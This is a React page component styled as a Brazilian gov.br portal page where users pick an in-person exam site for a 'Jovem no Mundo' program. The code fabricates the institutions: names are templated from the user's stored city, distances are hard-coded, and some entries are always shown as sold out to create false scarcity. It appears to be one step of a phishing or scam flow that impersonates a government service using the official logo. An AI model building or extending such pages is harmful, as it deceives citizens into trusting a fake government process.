import { useEffect, useMemo, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

export default function InstituicaoProva() {
  const navigate = useNavigate()
  const [selected, setSelected] = useState(null)
  const [city, setCity] = useState('Sua Cidade')

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    try {
      const addr = JSON.parse(localStorage.getItem('user_address') || '{}')
      if (addr?.cidade) setCity(addr.cidade)
    } catch {}
  }, [])

  const schools = useMemo(
    () => [
      { id: 1, name: `Polo Educacional Técnico de ${city}`, dist: 'Aprox. 4,2 km', status: 'disponivel' },
      { id: 2, name: 'Instituto F. de Ciências e Letras - Unidade Centro', dist: 'Aprox. 6,8 km', status: 'esgotado' },
      { id: 3, name: `Colégio Estadual Integrado ${city}`, dist: 'Aprox. 8,1 km', status: 'disponivel' },
      { id: 4, name: 'Centro de Aplicação Acadêmica (Zona Sul)', dist: 'Aprox. 12,5 km', status: 'esgotado' },
      { id: 5, name: 'Unidade Escolar de Excelência Padrão MEC', dist: 'Aprox. 18,3 km', status: 'disponivel' },
    ],
    [city]
  )

  function selectSchool(s) {
    if (s.status === 'esgotado') return
    setSelected(s.id)
    localStorage.setItem('exam_school', s.name)
  }

  function confirm() {
    if (!selected) return
    navigate('/selecao')
  }

  return (
    <>
      <GovHeader />

      <div className="container-gov pb-10">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <span className="text-gray-500">Local de Prova e Nivelamento Presencial</span>
        </div>

        <div
          style={{
            background: 'white',
            borderRadius: 8,
            padding: 40,
            margin: '40px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 800,
            boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
          }}
        >
          <h1 className="text-2xl font-black text-blue-900 mb-2 uppercase tracking-tight">
            Seleção de Instituição
          </h1>
          <p className="text-sm text-gray-600 mb-6 border-b pb-6">
            Diferente de avaliações online, o programa Jovem no Mundo exige a
            verificação presencial do candidato. Escolha uma das instituições
            credenciadas na sua região predefinida (
            <strong>{city}</strong>).
          </p>

          <div>
            {schools.map((s) => {
              const isSel = selected === s.id
              const isEsg = s.status === 'esgotado'
              const borderColor = isSel ? '#1351b4' : isEsg ? '#e2e8f0' : '#cbd5e1'
              const bg = isSel ? '#f0f7ff' : isEsg ? '#f1f5f9' : 'white'
              return (
                <div
                  key={s.id}
                  onClick={() => selectSchool(s)}
                  style={{
                    border: `1px solid ${borderColor}`,
                    borderRadius: 6,
                    padding: 20,
                    marginBottom: 15,
                    cursor: isEsg ? 'not-allowed' : 'pointer',
                    transition: 'all 0.2s',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center',
                    background: bg,
                    opacity: isEsg ? 0.5 : 1,
                    boxShadow: isSel ? '0 0 0 1px #1351b4' : 'none',
                  }}
                >
                  <div>
                    <div className="font-bold text-blue-900 text-[15px]">{s.name}</div>
                    <div className="text-[11px] text-gray-500 font-bold uppercase mt-1 flex items-center gap-2">
                      <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z"
                          clipRule="evenodd"
                        />
                      </svg>
                      {s.dist} de você
                    </div>
                  </div>
                  <div>
                    {isEsg ? (
                      <span className="bg-red-100 text-red-800 text-[10px] font-bold px-2 py-1 rounded uppercase">
                        Esgotado (0 Vagas)
                      </span>
                    ) : (
                      <span className="bg-green-100 text-green-800 text-[10px] font-bold px-2 py-1 rounded uppercase">
                        Vagas Abertas
                      </span>
                    )}
                  </div>
                </div>
              )
            })}
          </div>

          <button
            onClick={confirm}
            disabled={!selected}
            style={{
              backgroundColor: selected ? '#1351b4' : '#9ca3af',
              color: 'white',
              padding: 16,
              borderRadius: 30,
              fontWeight: 'bold',
              width: '100%',
              marginTop: 25,
              textTransform: 'uppercase',
              cursor: selected ? 'pointer' : 'not-allowed',
              border: 'none',
              fontSize: 15,
              boxShadow:
                '0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1)',
            }}
          >
            Confirmar Local do Exame Físico
          </button>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}
